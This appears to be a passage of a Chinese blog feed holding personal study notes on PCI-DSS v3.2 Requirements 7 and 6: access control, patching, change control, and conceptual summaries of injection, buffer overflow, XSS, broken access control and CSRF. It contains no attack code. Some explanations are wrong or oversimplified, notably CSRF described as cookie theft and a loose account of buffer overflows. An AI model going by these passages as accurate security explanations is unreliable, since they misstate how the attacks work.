基于个人的工作分类和职能分配访问权限"></a>7.1.3 基于个人的工作分类和职能分配访问权限</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-2016b312ac935202.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1.3"><br>就是对于个人的工作和职能累分配权限。在我们以及定义了觉得的访问需求之后，我们需要将这个需求转化为对应的权限，我们就可以根据之前定义和角色来赋予个人访问权限。</p><h4 id="7-1-4-需要制定所需权限的被授权方作出书面批准"><a href="#7-1-4-需要制定所需权限的被授权方作出书面批准" class="headerlink" title="7.1.4 需要制定所需权限的被授权方作出书面批准"></a>7.1.4 需要制定所需权限的被授权方作出书面批准</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-9cb821f90460a686.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1.4"><br>对于对个人进行赋予对用的角色的操作我们需要有一定的记录，以供检查，确保我们授予的权限和分配给个人的角色匹配。</p><h3 id="7-2-为系统组件监理访问控制系统，以根据用户的知情需要限制访问，并将系统设为“全部拒绝”，特别允许访问时除外"><a href="#7-2-为系统组件监理访问控制系统，以根据用户的知情需要限制访问，并将系统设为“全部拒绝”，特别允许访问时除外" class="headerlink" title="7.2 为系统组件监理访问控制系统，以根据用户的知情需要限制访问，并将系统设为“全部拒绝”，特别允许访问时除外"></a>7.2 为系统组件监理访问控制系统，以根据用户的知情需要限制访问，并将系统设为“全部拒绝”，特别允许访问时除外</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-d2f6bb8460f07d61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.2"><br>这就是白名单的思想，我们为系统组件建立访问控制的系统，默认是所有的人都不能访问，然后建立白名单，只有特别允许访问的才能访问。<br>该访问控制系统必须包含以下内容：</p><h4 id="7-2-1-所有系统组件范围"><a href="#7-2-1-所有系统组件范围" class="headerlink" title="7.2.1 所有系统组件范围"></a>7.2.1 所有系统组件范围</h4><h4 id="7-2-2-基于工作分类和职能为个人分配权限"><a href="#7-2-2-基于工作分类和职能为个人分配权限" class="headerlink" title="7.2.2 基于工作分类和职能为个人分配权限"></a>7.2.2 基于工作分类和职能为个人分配权限</h4><h4 id="7-2-3-将“拒绝全部”设为默认配置"><a href="#7-2-3-将“拒绝全部”设为默认配置" class="headerlink" title="7.2.3 将“拒绝全部”设为默认配置"></a>7.2.3 将“拒绝全部”设为默认配置</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-f3112c99ecf6eb19.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.2.1-7.2.3"><br>对于这个系统组件的访问控制系统我们必须要保证至少达到上面三个要求。<br>首先确保所有的系统组件在我们的访问控制系统的保护内，然后我们确定我们这个访问控制系统已经根据PCI DSS的要求为个人分配了权限，最后我们要保证默认设置是默认是“DENY ALL”，拒绝所有，使用白名单会比黑名单安全很多。</p><h3 id="7-3-确保已记录、正在使用且所有相关方了解用于持卡人数据访问的安全政策和操作程序"><a href="#7-3-确保已记录、正在使用且所有相关方了解用于持卡人数据访问的安全政策和操作程序" class="headerlink" title="7.3 确保已记录、正在使用且所有相关方了解用于持卡人数据访问的安全政策和操作程序"></a>7.3 确保已记录、正在使用且所有相关方了解用于持卡人数据访问的安全政策和操作程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-cf5f8190b03c8dc6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.3"><br>每一个要求的最后都有一个这样的小要求。我们要确保我们制定的限制对持卡人数据访问的方案有详细的记录，并且相关的工作人员都已经学习，并严格遵守。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说要求7主要提到三个思想，第一个是最小权限的原则，第二个是对个人使用已创建的角色来赋予权限的思想，第三个就是白名单的思想了。<br>最小权限就不说了前面提了很多次。说说第二个，这个就是我们首先定义每个角色，比如，测试员，操作员，监控员这样不同的角色，同时对每个角色定义所需的访问需求，明确角色和相对应的访问需求后（比如监控员只查看所有的配置的权限，没有更改的权限），这样我们就可以根据个人的工作职能来授予访问权限了。白名单呢，在很多方面是比黑名单更加安全的，我们默认拒绝所有的，只接受我们认为安全的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;PCI-DSS-V3-2-学习笔记-七&quot;&gt;&lt;a href=&quot;#PCI-
      
    
    </summary>
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PCI-DSS(V3.2)学习笔记(六)</title>
    <link href="https://rliyuqing.github.io/2018/05/28/19.%20PCI-DSS(V3.2.1)%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%85%AD)/"/>
    <id>https://rliyuqing.github.io/2018/05/28/19. PCI-DSS(V3.2.1)学习笔记(六)/</id>
    <published>2018-05-28T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.796Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="PCI-DSS-V3-2-学习笔记-六"><a href="#PCI-DSS-V3-2-学习笔记-六" class="headerlink" title="PCI-DSS(V3.2)学习笔记(六)"></a>PCI-DSS(V3.2)学习笔记(六)</h1><hr><h1 id="三、维护漏洞管理计划"><a href="#三、维护漏洞管理计划" class="headerlink" title="三、维护漏洞管理计划"></a>三、维护漏洞管理计划</h1><h2 id="要求6-：开发并维护安全的系统和应用程序"><a href="#要求6-：开发并维护安全的系统和应用程序" class="headerlink" title="要求6 ：开发并维护安全的系统和应用程序"></a>要求6 ：开发并维护安全的系统和应用程序</h2><p>windows的各种升级以及补丁大家肯定很熟悉了，为了防止各种漏洞的攻击微软经常要求我们更新，给系统打补丁。在我们的企业中，攻击者经常会使用我们的系统或者应用程序出现的漏洞进行攻击，所以我们要对我们的系统和应用程序进行实时的关注和维护，在漏洞被发现的时候第一时间响应。</p><h3 id="6-1-制定相关流程，通过使用良好的外部信源获取安全楼栋信息来识别安全漏洞，并未新发现的安全漏洞指定风险等级（例如“高”、“中”或“低”）"><a href="#6-1-制定相关流程，通过使用良好的外部信源获取安全楼栋信息来识别安全漏洞，并未新发现的安全漏洞指定风险等级（例如“高”、“中”或“低”）" class="headerlink" title="6.1 制定相关流程，通过使用良好的外部信源获取安全楼栋信息来识别安全漏洞，并未新发现的安全漏洞指定风险等级（例如“高”、“中”或“低”）"></a>6.1 制定相关流程，通过使用良好的外部信源获取安全楼栋信息来识别安全漏洞，并未新发现的安全漏洞指定风险等级（例如“高”、“中”或“低”）</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-53027f8ecda7c971.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.1"><br>对于我们正在使用的系统或者应用程序我们必须时刻关注和他相关的漏洞的出现。我们得有一定的信息收集渠道在漏洞出现的第一时间获取，并响应。比如CVE，国内的CNNVD或者国内一些著名的安全公司。<br>我们在第一时间获取这个漏洞情况的时候，第三方或者通报方肯定会有自己的风险等级分析的方案并给出漏洞的风险等级。我们详细了解这个漏洞之后，根据自己公司的情况以及公司自己的风险等级分析方案给出这个漏洞对于自己公司的风险等级，然后根据风险等级进行处理。<br>我们不是一次性就能扫描出所有的漏洞的，这个需要持续化的跟进，维护我们系统或应用程序的安全。<br>同时在处理漏洞的时候应该根据不同的风险等级有不用的优先级。对于被视为没有影响或者风险等级很低的漏洞，我们可能忽略，没有采取措施，但是一定要有记录，并持续对他进行风险分析，保证业务或者其他变动导致漏洞风险等级变高带来的威胁可以被及时发现。</p><h3 id="6-2-通过安装供应商提供的适用安全补丁，确保所有系统组件和软件杜绝已知漏洞。在发布后一个月内安装关键补丁"><a href="#6-2-通过安装供应商提供的适用安全补丁，确保所有系统组件和软件杜绝已知漏洞。在发布后一个月内安装关键补丁" class="headerlink" title="6.2 通过安装供应商提供的适用安全补丁，确保所有系统组件和软件杜绝已知漏洞。在发布后一个月内安装关键补丁"></a>6.2 通过安装供应商提供的适用安全补丁，确保所有系统组件和软件杜绝已知漏洞。在发布后一个月内安装关键补丁</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-bd0b0ea42851213f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.2-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-fa3209bc286b4f80.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.2-2"><br>在出现新的漏洞的时候我们及时安装供应商提供的补丁。可能因为打补丁会对业务或者其他产生不必要的损失，但是我们必须协调好，在一定的时间内安装好供应商提供的补丁。比如这里说的一个月内安装关键补丁。在没有安装的这段时间内也要有相应的应对攻击的策略，减少漏洞给我们带来的损失。</p><h3 id="6-3-遵照如下要求安全地开发内部和外部软件应用程序"><a href="#6-3-遵照如下要求安全地开发内部和外部软件应用程序" class="headerlink" title="6.3 遵照如下要求安全地开发内部和外部软件应用程序"></a>6.3 遵照如下要求安全地开发内部和外部软件应用程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-7ea1ef3133b88eb1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.3"><br>包括基于WEB的应用程序管理访问：<br>1、按照PCI DSS（例如安全验证和记录）<br>2、基于行业标准或最优方法<br>3、信息安全并入整个软件开发生命周期<br>这里从开发的角度直接从源头上尽量杜绝漏洞的产生。开发安全的系统或者应用程序，就得有安全的开发标准，代码标准等。<br>我们需要制定安全开发的标准，在软件或者应用程序的整个开发周期考虑到漏洞的可能产生。比如php安全开发手册，我们公司可能会有自己的标准，或者按照行业的标准或者按照PCI DSS的标准等。</p><h4 id="6-3-1-为识别任何潜在的编码漏洞（采用人工或自动流程），请在投入生产或向客户发布前审核自定义代码"><a href="#6-3-1-为识别任何潜在的编码漏洞（采用人工或自动流程），请在投入生产或向客户发布前审核自定义代码" class="headerlink" title="6.3.1 为识别任何潜在的编码漏洞（采用人工或自动流程），请在投入生产或向客户发布前审核自定义代码"></a>6.3.1 为识别任何潜在的编码漏洞（采用人工或自动流程），请在投入生产或向客户发布前审核自定义代码</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-0d5fbeec5dea259b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.3.1-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-a241f2b4950bac80.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.3.1-2"><br>在安全开发的过程中我们可能是有了已经通过安全编码审核的框架（或者之前已经经过审核的代码），但是这里面根据不同的环境不同的需求我们会将代码进行更改，这部分就属于自定义代码片段。<br>对于自定义代码片段，虽然我们的开发人员按照安全的编码标准去开发，但是难免也会有漏洞，所以在代码项目发布或者交给客户之前我们需要对其进行代码审计，白盒测试。需要在除项目开发人员以外的有安全代码审计经验的开发人员进行代码审计，并修正。<br>我们在项目投入使用之后发现了编码漏洞这个时候要修复付出的代价是很大的，所以一定要有上线前的代码审计，最好也可以在测试环境上线并进行其他测试，比如黑盒测试。</p><h3 id="6-4-系统组件的所有变更均须遵守变更控制流程和程序。"><a href="#6-4-系统组件的所有变更均须遵守变更控制流程和程序。" class="headerlink" title="6.4 系统组件的所有变更均须遵守变更控制流程和程序。"></a>6.4 系统组件的所有变更均须遵守变更控制流程和程序。</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-38bf260562727f07.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4"><br>该流程必须包括如下内容（6.4.1-6.4.6）。<br>对于系统组件的操作和更改我们必须有规定的流程和程序，并严格执行。我们对系统组件的变更也要有一定的控制和记录，防止系统组件变更带来的安全隐患。第一眼看着这个要求，可能是翻译也可能是自己的学识不够所以不是很理解，所以我们先简单的理解一下字面上的意思，我们详细的看看6.4里面的具体流程都有哪些要求。</p><h4 id="6-4-1-开发-测试环境独立于生产环境，并借助访问控制确保两者分离"><a href="#6-4-1-开发-测试环境独立于生产环境，并借助访问控制确保两者分离" class="headerlink" title="6.4.1 开发/测试环境独立于生产环境，并借助访问控制确保两者分离"></a>6.4.1 开发/测试环境独立于生产环境，并借助访问控制确保两者分离</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-7683ea05f0933367.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>测试环境和线上环境的分离是十分重要的，直接将线上环境当测试环境那如果一个不小心的操作很可能带来巨大的经济损失。这让我想起了前几个礼拜很多ofo用户都收到几个test消息，一看就是开发人员在线上进行测试了，所幸没有带来其他的影响。<br>对于测试环境我们也要通过访问控制将他与线上环境进行分离，因为我们的测试环境不断地变更，产生漏洞的可能性是很大的，如果没有将他和线上环境进行隔离的话，可能测试环境的漏洞直接给线上环境带来严重的威胁。</p><h4 id="6-4-2-开发-测试环境与生产环境中的职责分离"><a href="#6-4-2-开发-测试环境与生产环境中的职责分离" class="headerlink" title="6.4.2 开发/测试环境与生产环境中的职责分离"></a>6.4.2 开发/测试环境与生产环境中的职责分离</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-445fd2da5d87515e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.2"><br>这个其实让我联想到了最小权限的原则，对于不同的用户和场景我们只授予必要的权限，其他权限都默认禁止。对于测试环境和生产（线上）环境的职责和权限要分离。<br>比如开发者在测试环境可以有超管的权限，但是在生产环境就不一定，有可能只有用户最低的权限。对生产环境只有管理线上的工作人员才有权限。如果ofo对开发和测试人员进行职责的分离，就不会出现之前提到的情况了，开发或测试人员就不会有在线上环境直接测试的权限了。</p><h4 id="6-4-3-在测试或开发过程中不使用生产数据（真实的PAN）"><a href="#6-4-3-在测试或开发过程中不使用生产数据（真实的PAN）" class="headerlink" title="6.4.3 在测试或开发过程中不使用生产数据（真实的PAN）"></a>6.4.3 在测试或开发过程中不使用生产数据（真实的PAN）</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c55c7503a88e57fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.3"><br>我们在测试环境测试一个系统或者应用程序的时候和实际线上环境还是有差别的，因为我们没有线上实际的用户数据，所有为了完整的安全测试或其他测试来说我们可能需要自己生成这样的数据。<br>一定确保在测试环境不用使用生产环境中用户或者其他的真实数据（比如用户身份信息或者管理员账号密码等），我们的测试样本必须是自己生成的。因为开发测试的环境是经常变动且不安全的，存在很多安全隐患可能会造成数据的泄露。</p><h4 id="6-4-4-在机会系统-系统投入生产之前、删除系统组件中的测试数据和账号"><a href="#6-4-4-在机会系统-系统投入生产之前、删除系统组件中的测试数据和账号" class="headerlink" title="6.4.4 在机会系统/系统投入生产之前、删除系统组件中的测试数据和账号"></a>6.4.4 在机会系统/系统投入生产之前、删除系统组件中的测试数据和账号</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-aac673ecfe1a9866.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.4"><br>在测试环境经过一系列测试之后我们的系统或者应用程序即将发布，但是因为我们测试系统时使用了很多我们自己编造的数据或者测试的账号，在系统投入使用之前，我们需要将这些我们留下的测试痕迹清除，防止攻击者利用我们留下的数据进行攻击。<br>我们在测试环境测试的时候肯定会图方便，留下一些不安全的隐患，比如弱密码的test测试账号等，如果没有清除这些测试数据和账号，攻击者可能就会利用这些来了解我们的系统，发起攻击。</p><h4 id="6-4-5-变更控制程序包含（6-4-5-1-6-4-5-4）"><a href="#6-4-5-变更控制程序包含（6-4-5-1-6-4-5-4）" class="headerlink" title="6.4.5 变更控制程序包含（6.4.5.1-6.4.5.4）"></a>6.4.5 变更控制程序包含（6.4.5.1-6.4.5.4）</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-9238a4db5048bbc8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.5"><br>对于软件或者系统的变更我们必须要有一个控制他的程序，方案。因为我们软件在更新或者打补丁的时候可能会对整个环境产生影响，或者产生一些很玄学的影响，所以我们在软件变更的时候一定要有一个控制的方案，程序来控制和处理这个变更带来的影响。具体这个变更控制程序的基本要求我们看一下6.4.5.1-6.4.5.4</p><h5 id="6-4-5-1-影响记录"><a href="#6-4-5-1-影响记录" class="headerlink" title="6.4.5.1 影响记录"></a>6.4.5.1 影响记录</h5><p><img src="https://upload-images.jianshu.io/upload_images/6269327-781aa55e419d81a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.5.1"><br>对于每次软件变更带来的影响我们都需要进行记录，这样可以为下一次的变更有一个参照，更好的分析变更产生影响的原因，更好的制定对变更之后影响的解决方案。</p><h5 id="6-4-5-2-被授权方的变更审批记录"><a href="#6-4-5-2-被授权方的变更审批记录" class="headerlink" title="6.4.5.2 被授权方的变更审批记录"></a>6.4.5.2 被授权方的变更审批记录</h5><p><img src="https://upload-images.jianshu.io/upload_images/6269327-a5e808d672ffbe83.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.5.2"><br>我们进行测试变更时，需要保证这个测试的样本的变更是被授权的。比如说测试给一个软件打补丁的影响的时候，我们需要确认这个补丁是供应方官方发布的，并且这个补丁在供应方以及有通过审核的详细记录了，我们才能进行安装补丁的带来的影响的测试。</p><h5 id="6-4-5-3-功能测试，以确认该变更未对系统安全性造成不利影响"><a href="#6-4-5-3-功能测试，以确认该变更未对系统安全性造成不利影响" class="headerlink" title="6.4.5.3 功能测试，以确认该变更未对系统安全性造成不利影响"></a>6.4.5.3 功能测试，以确认该变更未对系统安全性造成不利影响</h5><p><img src="https://upload-images.jianshu.io/upload_images/6269327-8db4e2a02c0753d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.5.3"><br>在对一个系统进行变更，比如升级之后，我们需要进行功能测试，就是对系统的各功能进行测试，确保系统变更之后还在我们的安全体系保障之内，不会产生新的安全问题。<br>通过全面的测试我们要确认在变更之后这个系统仍让受我们安全策略的保护。</p><h5 id="6-4-5-4-取消程序"><a href="#6-4-5-4-取消程序" class="headerlink" title="6.4.5.4 取消程序"></a>6.4.5.4 取消程序</h5><p><img src="https://upload-images.jianshu.io/upload_images/6269327-f4e123c480853f3e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.5.4"><br>就算我们提前经过变更测试，并记录了测试带来的影响。但是在实际的变更过程中还是有可能会有其他影响发生的，所以我们一定要确保这个变更有取消的程序，我们可以降级或者卸载补丁恢复到之前的环境。<br>环境问题有时候还是很玄学的，取消程序也是必不可少的挽回损失的关键一步。</p><h4 id="6-4-6-完成重要变更后，须对所有新的或变更的系统和网络实施所有相关的PCI-DSS要求，并在适当情况下更新文档记录"><a href="#6-4-6-完成重要变更后，须对所有新的或变更的系统和网络实施所有相关的PCI-DSS要求，并在适当情况下更新文档记录" class="headerlink" title="6.4.6 完成重要变更后，须对所有新的或变更的系统和网络实施所有相关的PCI DSS要求，并在适当情况下更新文档记录"></a>6.4.6 完成重要变更后，须对所有新的或变更的系统和网络实施所有相关的PCI DSS要求，并在适当情况下更新文档记录</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-7f512550431ce970.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.4.6"><br>我们前面说到要保证变更之后系统或应用程序仍在我们的安全策略保护之内，这里同时要求我们变更后，受变更影响的系统或者网络我们必须重新验证，并保证其仍然符合PCI DSS的要求。<br>比如重置新系统的默认密码，删除新系统的默认账号，以及新的网络图等等。这是很关键的要求，这样才能保证我们所有的重要系统或者网络在PCI DSS的要求内，不会出现重要的系统或网络没有受到安全保护。<br>这就相当于写了一个死循环，开始是我在PCI DSS的标准内，因为系统或者程序的变更，发生了变化，在继续按照PCI DSS的标准重新规范我们的新系统。这样就保证我们的系统或网络始终在PCI DSS的标准范围内。</p><h3 id="6-5-按照以下方式处理软件流程中常见的编码漏洞"><a href="#6-5-按照以下方式处理软件流程中常见的编码漏洞" class="headerlink" title="6.5 按照以下方式处理软件流程中常见的编码漏洞"></a>6.5 按照以下方式处理软件流程中常见的编码漏洞</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-5d154e8613687097.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-7cb6076895ef1a55.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5-2"><br>方式：<br>1、至少每年对开发人员进行一次最新安全编码技术方面的培训，包括如何避免常见的编码漏洞<br>2、根据安全编码指南开发应用程序<br>上面都说了在开发过程中清理排除编码漏洞，但是总会有漏网之鱼，我们也要有万全之策，如果出现了编码漏洞我们也得有应对策略。<br>我们要有适当的流程保证开发过程中避免编码漏洞的产生（定期安全编码培训，安全编码指南），以及漏洞产生之后的应对措施。对于编码漏洞我们尽力做到最好，如果有不足的地方我们也要有弥补的方法，这里的6.5.1-6.5.10是我们至少要能应对的编码漏洞，都是一些著名的高危漏洞。</p><h4 id="6-5-1-注入攻击"><a href="#6-5-1-注入攻击" class="headerlink" title="6.5.1 注入攻击"></a>6.5.1 注入攻击</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-0adcffbe269327be.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.1"><br>特别是SQL注入，同时还需考虑OS命令注入、LDAP、Xpath等其他注入攻击。<br>我们关注OWASP  top ten就会发现历年来，注入蝉联榜首已经很多年了，灰产内利用注入批量攻击的工具更是数不胜数。由此可见注入带来的危害有多大，范围有多广；我们安全开发人员也得有多重视。<br>有过经验的安全从业者都知道，数据与代码分离的原则是解决注入漏洞的关键。所有的注入类型的漏洞都是因为服务器将用户输入的数据当成代码执行了，混淆了数据和代码的边界。<br>对于用户的输入我们都认为是数据，杜绝他变成代码并执行时解决注入问题的关键。所以要合理处理，验证用户的输入，确保其不会变成代码执行。或者利用参数化查询。<br>同时我们也要确保输入的验证不会影响用户的体验，要合理的处理用户的输入数据。</p><h4 id="6-5-2-缓冲区溢出"><a href="#6-5-2-缓冲区溢出" class="headerlink" title="6.5.2 缓冲区溢出"></a>6.5.2 缓冲区溢出</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-107901fdcf1908a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.2"><br>其实缓冲区溢出和注入的原理差不多，都是因为服务器将数据当做代码来执行了。程序在栈或者堆中，将用户数据当做代码执行，混淆了数据和代码的边界。<br>对于缓冲区溢出的问题，我们可以通过验证缓冲区边界，截取输入字符串来解决。<br>简单的说在进程地址中有数据段和代码段，因为数据段受空间大小的限制，当我们输入的数据超过这个数据段的空间时，数据就会被挤到下面的代码段，并当成代码执行。<br>详细的缓冲区溢出可以上网看看各种原理分析。</p><h4 id="6-5-4-非安全加密存储"><a href="#6-5-4-非安全加密存储" class="headerlink" title="6.5.4 非安全加密存储"></a>6.5.4 非安全加密存储</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-b2c142188b41dbdb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.3"><br>使用了容易破解的加密方法加密存储数据或者甚至没有加密就存储数据，攻击者就很容易便可以得到数据的明文。<br>我们可以使用强效的加密算法加密我们数据或者很多其他强效的加密手段。</p><h4 id="6-5-4-非安全通信"><a href="#6-5-4-非安全通信" class="headerlink" title="6.5.4 非安全通信"></a>6.5.4 非安全通信</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-04834e401994b570.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.4"><br>同样，我们使用费非安全信道进行通信也是极其危险的，对于非安全的通信我们得有加密的手段来保证其是安全的。比如使用https等。</p><h4 id="6-5-5-不正确的错误处理"><a href="#6-5-5-不正确的错误处理" class="headerlink" title="6.5.5  不正确的错误处理"></a>6.5.5  不正确的错误处理</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-804f66e7733a7309.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.5"><br>这一点很多公司的安全上都没有注意到。我感觉注意是两个方面，一个是对于代码上的错误没有进行正确的处理导致敏感信息泄露，比如我们访问一些网站的错误请求时会有报错提示，这里可能会泄露网站的物理路径等信息。<br>第二个就是业务方面了，比如用户登录的时候，对于错误的登录请求时，服务器对密码错误和用户名错误进行了自以为贴心的区别处理，用户名存在，密码错误就提示：“密码错误”，用户名和密码都不对就提示：“用户名错误”，虽然提高了一些用户体验，但是带来的更多还是安全隐患。攻击者可以根据这不同的提示爆破用户的密码。</p><h4 id="6-5-6-漏洞识别流程中确认的所有“高风险”漏洞"><a href="#6-5-6-漏洞识别流程中确认的所有“高风险”漏洞" class="headerlink" title="6.5.6 漏洞识别流程中确认的所有“高风险”漏洞"></a>6.5.6 漏洞识别流程中确认的所有“高风险”漏洞</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-42eab9b4322a6ed3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.6"><br>还有很多其他的漏洞，有一些可能其他方威胁分析为低的对于我们所处的公司实际为高风险，所以我们在前面说过公司要自己根据不同情况分析漏洞的风险等级，然后进行处理。我们对这“高风险”的漏洞也要有应对的措施。确保发现这样的漏洞后能及时相应，最大化减少损失。</p><h4 id="6-5-7-跨站脚本"><a href="#6-5-7-跨站脚本" class="headerlink" title="6.5.7 跨站脚本"></a>6.5.7 跨站脚本</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-010e638c48b00a3d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.7"><br>6.5.1到6.5.6都是适用所有的应用程序来说，6.5.7到6.5.10则是适用于网络应用程序和应用程序的接口。<br>XSS就是利用“HTML注入”的方式，给网页嵌入了恶意脚本，从而在用户浏览网页的时候，执行恶意脚本进行攻击。<br>但是其实XSS的场景很复杂，很难解决，场景不同我们的处理方式也不同。这里说道对参数在应用前进行验证，是否合法以及利用上下文相关的转义。<br>涉及到用户输入的数据被当做代码执行的情况，都是混淆的数据和代码的边界，最重要的方法就是输入的检测。</p><h4 id="6-5-8-不正确的访问控制"><a href="#6-5-8-不正确的访问控制" class="headerlink" title="6.5.8 不正确的访问控制"></a>6.5.8 不正确的访问控制</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-d336bb3f467a7502.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.8"><br>例如不安全的直接对象引用、未能限制网址访问、目录遍历和未能限制用户的功能访问。<br>损坏的访问控制在OWASP 2017中排在了第五的位置，甚至超过了第七的XSS。<br>不正确的访问控制十分的危险，没有一个完善的访问控制机制，攻击者可以轻松的伪造成某些用户进行访问。或者其他的访问控制缺失，导致url上显示了具体的文件名，导致用户可以未授权的更改文件名进行访问。<br>这里包括很多情况，但是最主要的就是访问控制机制的不完善，导致攻击者可以在未授权的情况访问不该被访问的敏感内容（如数据，文件等）。博主校园网内部的财务系统就曾出现了类似的的问题，因为使用的是校园统一认证，用学生的身份经过统一认证之后，跳转的时候更改访问的id就可以用不同的学生或教师身份登录。这就是典型的访问控制机制的缺失，不完善。<br>我们要根据具体出现的情况进行漏洞的修复，比如这里提到的正确的验证用户的身份，确保不会被伪造，以及对未授权的功能不允许用户访问，还有不想用户暴力内部对象引用也很重要，攻击者就更难构造这样的伪造访问。</p><h4 id="6-5-9-跨站请求伪造（CSRF）"><a href="#6-5-9-跨站请求伪造（CSRF）" class="headerlink" title="6.5.9 跨站请求伪造（CSRF）"></a>6.5.9 跨站请求伪造（CSRF）</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-1b5b034e83150c8d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.5.9"><br>跨站请求伪造也是典型的高危漏洞之一。简而言之就是攻击者盗用用户的身份并发送恶意请求。我们窃取了用户的会话令牌，也就是到浏览器的Cookies。比如说我们诱使目标访问淘宝，使他淘宝用户的session cookies有效，然后实施csrf，让他访问一个购买商品的链接或者其他我们想要的动作对应的链接。<br>这就是因为我们会话管理和验证失效了，应对措施这里有不暴露会话id以及添加超时和轮换id等等。还有一些比如验证码手段，强制用户和应用进行交互才能完成请求。</p><h3 id="6-6-对于面向公众的网络应用程序，应不断解决新的威胁和漏洞，并通过一下任一方法确保这些应用程序不会受到攻击"><a href="#6-6-对于面向公众的网络应用程序，应不断解决新的威胁和漏洞，并通过一下任一方法确保这些应用程序不会受到攻击" class="headerlink" title="6.6 对于面向公众的网络应用程序，应不断解决新的威胁和漏洞，并通过一下任一方法确保这些应用程序不会受到攻击"></a>6.6 对于面向公众的网络应用程序，应不断解决新的威胁和漏洞，并通过一下任一方法确保这些应用程序不会受到攻击</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-b38cd81bf796a59e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" 